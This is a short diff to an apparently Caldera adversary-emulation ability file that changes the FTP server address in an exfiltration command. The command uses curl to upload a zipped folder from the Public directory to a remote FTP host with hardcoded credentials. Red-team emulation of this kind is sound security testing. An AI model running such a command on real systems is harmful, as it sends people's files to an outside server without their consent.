@@ -8,10 +8,10 @@
     additional_info: {}
     build_target: null
     parsers: []
-    command: 'SET Username=caldera_user && SET Password=caldera && SET Ftp=ftp://192.168.0.149
+    command: 'SET Username=caldera_user && SET Password=caldera && SET Ftp=ftp://172.16.16.20
       && SET FtpPort=2222 && SET ArchiveName=data.zip && SET LocalStorageDir=exf &&
       SET WholePathArchive=%PUBLIC%\exf\data.zip && curl -T c:\Users\Public\exf\data.zip
-      -u "caldera_user:caldera" ftp://192.168.0.149:2222
+      -u "caldera_user:caldera" ftp://172.16.16.20:2222
       '
     timeout: 180
     code: null
